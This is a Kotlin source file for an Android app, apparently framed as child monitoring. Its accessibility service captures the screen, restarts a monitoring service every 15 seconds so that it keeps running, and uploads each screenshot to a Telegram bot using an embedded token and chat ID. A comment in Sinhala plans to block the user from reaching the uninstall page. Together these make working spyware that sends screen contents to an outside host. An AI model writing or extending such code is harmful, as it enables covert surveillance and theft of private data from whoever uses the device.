package com.coc338781.childapp

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class ScreenService : AccessibilityService() {

    companion object {
        var instance: ScreenService? = null
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val watchdogHandler = Handler(Looper.getMainLooper())
    private var watchdogRunnable: Runnable? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("ScreenService", "Connected — starting watchdog")
        startWatchdog()
    }

    private fun startWatchdog() {
        stopWatchdog()
        watchdogRunnable = object : Runnable {
            override fun run() {
                try {
                    // MonitoringService එක run වෙනවද බලන්න
                    if (!MonitoringService.isRunning) {
                        Log.d("ScreenService", "MonitoringService not running — restarting")
                        val intent = Intent(applicationContext, MonitoringService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            applicationContext.startForegroundService(intent)
                        } else {
                            applicationContext.startService(intent)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("ScreenService", "Watchdog error", e)
                }
                // හැම 15s එකට check කරන්න
                watchdogHandler.postDelayed(this, 15000L)
            }
        }
        watchdogHandler.postDelayed(watchdogRunnable!!, 3000L)
    }

    private fun stopWatchdog() {
        watchdogRunnable?.let { watchdogHandler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Settings වලින් uninstall page එකට යන්න try කරනවා නම් block කරන්න
        // (optional protection — මේක පස්සේ කරමු)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        stopWatchdog()
        instance = null
        Log.d("ScreenService", "Destroyed")
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun takeShot(callback: (Bitmap?) -> Unit) {
        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val bmp = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                        result.hardwareBuffer.close()
                        callback(bmp)
                    } catch (e: Exception) { callback(null) }
                }
                override fun onFailure(errorCode: Int) { callback(null) }
            })
    }

    fun sendScreen(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.JPEG, 70, it) }
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) { Log.e("ScreenService", "err", e) }
        }
    }
}
